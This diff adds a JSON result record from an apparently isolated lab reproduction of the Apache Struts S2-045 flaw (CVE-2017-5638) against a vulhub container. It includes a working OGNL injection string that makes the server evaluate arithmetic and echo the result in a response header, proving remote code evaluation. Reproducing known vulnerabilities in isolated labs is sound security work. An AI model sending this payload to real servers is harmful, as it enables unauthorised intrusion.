@@ -1,0 +1,28 @@
+{
+  "chain": "struts-s2-045",
+  "run_at": "2026-11-14T22:52:04.919410+00:00",
+  "steps": [
+    {
+      "step": "benign",
+      "observed": "vulhub-header=None",
+      "expected": "vulhub-header=None",
+      "ok": true
+    },
+    {
+      "step": "ognl_arithmetic_probe",
+      "injection": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data",
+      "observed": "vulhub-header=54289",
+      "expected": "vulhub-header=54289",
+      "ok": true
+    }
+  ],
+  "status": "PASS",
+  "fidelity": {
+    "reproduced": [
+      "S2-045 OGNL evaluation (RCE capability)"
+    ],
+    "real_target": "vulhub/struts2:2.3.30 (real CVE-2017-5638)",
+    "observable": "response header vulhub=54289 proves attacker OGNL is evaluated; no payload/file/shell used.",
+    "safety": "isolation guard confirmed host+internet unreachable before deploy; internal network only."
+  }
+}
